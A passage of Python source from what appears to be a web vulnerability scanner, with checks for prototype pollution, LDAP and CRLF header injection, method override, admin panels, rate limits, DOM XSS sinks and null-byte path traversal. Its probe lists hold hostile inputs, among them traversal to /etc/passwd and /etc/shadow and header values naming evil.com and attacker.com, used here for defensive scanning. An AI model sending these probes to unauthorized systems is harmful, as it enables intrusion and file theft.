        r = _fetch(ip, port, f"/wp-content/plugins/{slug}/readme.txt", auth=auth)
        if r and r[0] == 200 and "=== " in r[2]:
            pv = re.search(r"Stable tag:\s*([\d.]+)", r[2])
            pver = pv.group(1) if pv else "?"
            out.append(_mk(ip, port, "web-wp-plugin", "info",
                           f"WordPress plugin '{slug}' v{pver} present", ["CWE-1104"],
                           f"{base}/wp-content/plugins/{slug}/ (readme Stable tag {pver}); "
                           "check it against wpscan/searchsploit.",
                           "Keep plugins current; remove unused ones."))
    return out




def _check_prototype_pollution(ip: str, port: Port, auth: dict | None) -> list[Vuln]:
    """Prototype pollution detection via __proto__ / constructor / prototype chains."""
    payloads = [
        ("/?__proto__[polluted]=true", "polluted"),
        ("/?constructor[prototype][polluted]=true", "polluted"),
        ("/?data[__proto__][admin]=true", "admin"),
    ]
    for payload, marker in payloads:
        try:
            r = _fetch(ip, port, payload, auth=auth, read=2048)
            if r and marker in r[2]:
                return [_mk(ip, port, "web-proto-pollution", "high",
                    "Prototype Pollution via query parameters", ["CWE-1321"],
                    f"Query string parameter reflected prototype chain: {payload}",
                    "Never trust user input for object property assignment; use Object.assign with frozen objects",
                    confidence="potential")]
        except Exception:
            pass
    return []




def _check_ldap_injection(ip: str, port: Port, auth: dict | None) -> list[Vuln]:
    """LDAP injection detection via wildcard and filter operators."""
    probes = [
        ("/?search=*", "*", "LDAP wildcard bypass"),
        ("/?search=admin*", "admin", "LDAP filter injection"),
    ]
    for payload, marker, desc in probes:
        try:
            r = _fetch(ip, port, payload, auth=auth, read=2048)
            if r and r[0] == 200 and marker in r[2].lower():
                return [_mk(ip, port, "web-ldap-injection", "high",
                    "LDAP Injection", ["CWE-90"],
                    f"LDAP filter accepted wildcard/filter operators: {payload}",
                    "Use LDAP escaping; parameterize all filter inputs",
                    confidence="potential")]
        except Exception:
            pass
    return []




def _check_header_injection(ip: str, port: Port, auth: dict | None) -> list[Vuln]:
    """HTTP Header Injection via CRLF in custom headers."""
    payloads = {
        "X-Custom": "test\r\nX-Injected: hacked",
        "X-Original-URL": "http://evil.com",
        "X-Forwarded-For": "127.0.0.1, attacker.com",
    }
    for header, value in payloads.items():
        try:
            hdrs = {header: value}
            if auth:
                hdrs.update(auth)
            r = _fetch(ip, port, "/", auth=hdrs, read=2048)
            if r and ("injected" in r[1].lower() or "attacker" in r[2].lower()):
                return [_mk(ip, port, "web-header-injection", "high",
                    f"HTTP Header Injection via {header}", ["CWE-113"],
                    f"Custom header {header} was reflected or processed: {value[:40]}",
                    "Never reflect user input into response headers; use safe header APIs",
                    confidence="potential")]
        except Exception:
            pass
    return []




def _check_method_override(ip: str, port: Port, auth: dict | None) -> list[Vuln]:
    """HTTP method override via headers or parameters: X-HTTP-Method-Override, _method, etc."""
    tests = [
        ("X-HTTP-Method-Override", "DELETE"),
        ("X-Method-Override", "DELETE"),
        ("X-HTTP-Method", "DELETE"),
        ("_method", "DELETE", "/?_method=DELETE"),  # param not header
    ]
    for test in tests:
        try:
            if len(test) == 3:  # param test
                header, method, path = None, None, test[2]
                r = _fetch(ip, port, path, method="POST", auth=auth, read=2048)
            else:
                header, method = test
                hdrs = {**(auth or {}), header: method}
                r = _fetch(ip, port, "/", method="POST", auth=hdrs, read=2048)
            if r and r[0] in (200, 204, 405):  # 405 = method not allowed by DELETE
                return [_mk(ip, port, "web-method-override", "high",
                    f"HTTP Method Override via {test[0] if len(test) == 2 else test[2].split('=')[0]}", ["CWE-20"],
                    f"Server processed {method or 'alternate'} method via {test[0]}. Can bypass auth/ACLs.",
                    "Never trust HTTP method from headers/params; use only HTTP verb",
                    confidence="potential")]
        except Exception:
            pass
    return []




def _check_admin_panels(ip: str, port: Port, base: str, auth: dict | None) -> list[Vuln]:
    """Discover common admin/management panels. Compares against a random-path
    baseline so a 'catch-all 200' SPA doesn't produce a finding for every path."""
    admin_paths = [
        "/admin", "/administrator", "/admin/login", "/admin/index.php",
        "/wp-admin", "/wp-login.php",
        "/phpmyadmin", "/pma", "/mysqladmin",
        "/cpanel", "/whm", "/webhost", "/cPanel",
        "/plesk", "/ispsconfig",
        "/console", "/manager", "/jenkins", "/grafana",
        "/api/admin", "/api-admin", "/api/dashboard",
        "/dev", "/development", "/staging", "/test",
        "/.well-known/admin",
    ]
    # Baseline against a path that cannot exist; a server that answers 200 for it
    # will answer 200 for everything, so the admin-path hits mean nothing.
    try:
        base_r = _fetch(ip, port, "/recce-nonexistent-baseline-a7f3", auth=auth, read=512)
    except Exception:
        base_r = None
    baseline_200 = bool(base_r and base_r[0] == 200)
    findings = []
    for path in admin_paths:
        try:
            r = _fetch(ip, port, path, auth=auth, read=4096)
            if not r or r[0] not in (200, 301, 302, 401, 403):
                continue
            if r[0] == 200 and baseline_200:
                continue                       # SPA-style catch-all - not evidence
            raw_title = ""
            if "<title>" in r[2] and "</title>" in r[2]:
                raw_title = r[2][r[2].find("<title>")+7:r[2].find("</title>")]
            # Server-controlled bytes flow into Vuln.output → CSV/XLSX exports; strip
            # control chars and cap length so a hostile title can't corrupt a row.
            title = re.sub(r"[\x00-\x1f\x7f]", " ", raw_title)[:80]
            status_desc = "redirected" if r[0] in (301, 302) else "found"
            findings.append(_mk(ip, port, "web-admin-panel", "medium",
                f"Admin/Management panel discovered at {path}", ["CWE-200"],
                f"GET {path} -> HTTP {r[0]} {status_desc}. Title: {title}",
                "Restrict admin panels to internal IPs; require MFA",
                confidence="confirmed" if r[0] == 200 else "potential"))
        except Exception:
            pass
    return findings[:3]  # Limit to top 3 to avoid noise




def _check_race_condition(ip: str, port: Port, base: str, auth: dict | None) -> list[Vuln]:
    """Race condition detection via timing analysis (concurrent requests)."""
    import threading
    timing = []
    path = "/?account_balance"

    def probe():
        try:
            t0 = time.monotonic()
            _fetch(ip, port, path, auth=auth, read=512)
            timing.append(time.monotonic() - t0)
        except Exception:
            pass

    # Fire 5 concurrent requests and measure variance
    threads = [threading.Thread(target=probe) for _ in range(5)]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=15)

    if timing and len(timing) >= 3:
        avg = sum(timing) / len(timing)
        variance = max(timing) - min(timing)
        if variance > avg * 0.5:  # >50% variance suggests timing-dependent logic
            return [_mk(ip, port, "web-race-condition", "medium",
                "Potential race condition (timing variance detected)", ["CWE-362"],
                f"Request timing variance {variance:.3f}s on {path} suggests concurrent state mutations. "
                f"Manual testing needed (concurrent withdrawals, duplicate submissions).",
                "Use atomic transactions; test concurrent access; implement idempotency",
                confidence="potential")]
    return []




def _check_dom_xss(ip: str, port: Port, body: str, auth: dict | None) -> list[Vuln]:
    """Detect DOM XSS sinks: document.write, innerHTML, eval in JavaScript."""
    dangerous_sinks = [
        r"document\.write\s*\(",
        r"\.innerHTML\s*=",
        r"\.outerHTML\s*=",
        r"eval\s*\(",
        r"Function\s*\(",
        r"setTimeout\s*\(\s*['\"].*['\"]",
        r"\.insertAdjacentHTML\s*\(",
    ]
    for sink in dangerous_sinks:
        if re.search(sink, body, re.I):
            return [_mk(ip, port, "web-dom-xss", "high",
                f"DOM-based XSS sink detected: {sink.split(chr(92))[0]}", ["CWE-79"],
                f"JavaScript contains dangerous sink pattern. If source is user-controlled, DOM XSS possible.",
                "Use textContent instead of innerHTML; avoid eval; use Content Security Policy",
                confidence="potential")]
    return []




def _check_type_confusion(ip: str, port: Port, base: str, auth: dict | None) -> list[Vuln]:
    """Type confusion: string vs int, truthy logic abuse. Requires a stable size
    delta - two probes each side, both showing the same divergence - so ordinary
    dynamic content (timestamps, request IDs, ads) doesn't fire the check."""
    probes = [
        ("/?id=0", "/?id=false", "falsy string vs zero"),
        ("/?id=1", "/?id=true", "truthy string vs one"),
        ("/?admin=0", "/?admin=false", "false vs \"0\" check"),
    ]
    for p1, p2, desc in probes:
        try:
            r1a = _fetch(ip, port, p1, auth=auth, read=2048)
            r2a = _fetch(ip, port, p2, auth=auth, read=2048)
            r1b = _fetch(ip, port, p1, auth=auth, read=2048)
            r2b = _fetch(ip, port, p2, auth=auth, read=2048)
            if not (r1a and r2a and r1b and r2b):
                continue
            if not (r1a[0] == r2a[0] == r1b[0] == r2b[0]):
                continue
            def diverges(a, b) -> bool:
                if not a or not b: return False
                return len(a) > len(b) * 1.5 or len(b) > len(a) * 1.5
            if diverges(r1a[2], r2a[2]) and diverges(r1b[2], r2b[2]):
                return [_mk(ip, port, "web-type-confusion", "medium",
                    f"Type confusion / Logic error via {desc}", ["CWE-1025"],
                    f"Parameters {p1} and {p2} produced stably-different responses. "
                    f"May indicate type-coercion logic error (0 == false).",
                    "Explicitly check types; use strict equality (=== not ==)",
                    confidence="potential")]
        except Exception:
            pass
    return []




def _check_rate_limits(ip: str, port: Port, base: str, auth: dict | None) -> list[Vuln]:
    """Rate-limit detection: fire rapid requests and check for 429/throttle. The
    burst runs back-to-back with no artificial sleep; the earlier 50ms sleep put
    the ceiling at ~20 req/s so the 'no rate limit at >100 req/s' branch was
    unreachable and never fired."""
    findings = []
    t0 = time.monotonic()
    responses = []
    for i in range(20):
        try:
            r = _fetch(ip, port, f"/?burst={i}", auth=auth, read=512)
            if r:
                responses.append(r[0])
        except Exception:
            pass

    elapsed = time.monotonic() - t0
    rate = len(responses) / elapsed if elapsed > 0 else 0

    if 429 not in responses and rate > 50 and len(responses) >= 15:
        findings.append(_mk(ip, port, "web-no-rate-limit", "medium",
            "No rate limiting detected", ["CWE-770"],
            f"Rapid requests ({rate:.0f} req/sec) not throttled. Enables brute-force, DoS, scraping.",
            "Implement per-IP rate limiting; use CAPTCHA; exponential backoff",
            confidence="potential"))
    elif 429 in responses:
        findings.append(_mk(ip, port, "web-rate-limit-present", "info",
            "Rate limiting detected (good)", ["CWE-770"],
            f"HTTP 429 received after {responses.index(429)} requests.",
            "Rate limiting is properly implemented.",
            confidence="confirmed"))
    return findings




_PASSWD_RE = re.compile(r"^root:[^:\n]*:0:0:", re.M)




def _check_null_byte_injection(ip: str, port: Port, base: str, auth: dict | None) -> list[Vuln]:
    """Null byte injection: path traversal bypass via %00 termination. Only fires on
    the real /etc/passwd line format (`root:...:0:0:`) - a substring check on 'root:'
    hit every Linux docs page and produced spurious 'confirmed high' findings."""
    probes = [
        "/?file=../../etc/passwd%00.jpg",
        "/?file=../../etc/shadow%00.txt",
    ]
    for probe in probes:
        try:
            r = _fetch(ip, port, probe, auth=auth, read=4096)
            if r and r[0] == 200 and _PASSWD_RE.search(r[2]):
                return [_mk(ip, port, "web-null-byte", "high",
                    "Null byte injection (file disclosure)", ["CWE-22"],
                    f"Null byte terminator {probe.split('=')[1][:30]}... bypassed extension check",
                    "Validate and canonicalize paths; reject %00; use allow-lists",
                    confidence="confirmed")]
        except Exception:
            pass
    return []




def _check_bot_detection_bypass(ip: str, port: Port, base: str, auth: dict | None) -> list[Vuln]:
    """Bot detection bypass fingerprints: missing User-Agent, headless detection."""
    findings = []
    test_headers = [
        ({}, "no User-Agent"),
        ({"User-Agent": ""}, "empty User-Agent"),
        ({"User-Agent": "curl/7.0"}, "curl User-Agent"),
        ({"User-Agent": "python-requests"}, "python User-Agent"),
    ]

    for hdrs, desc in test_headers:
        try:
            if auth:
                hdrs.update(auth)
            r = _fetch(ip, port, "/", auth=hdrs, read=2048)
            if r and r[0] == 200:
                # Check for bot-detection bypass: missing headers bypassed detection
                if "please enable javascript" not in r[2].lower() and "bot" not in r[2].lower():
                    findings.append(_mk(ip, port, "web-bot-bypass", "low",
                        f"Bot detection possible bypass: {desc}", ["CWE-200"],
                        f"Request with {desc} was not challenged by bot detection (if present).",
                        "Require JavaScript execution; validate headless detection; use CAPTCHA",
                        confidence="potential"))
        except Exception:
            pass
    return findings[:1]  # Return first hit
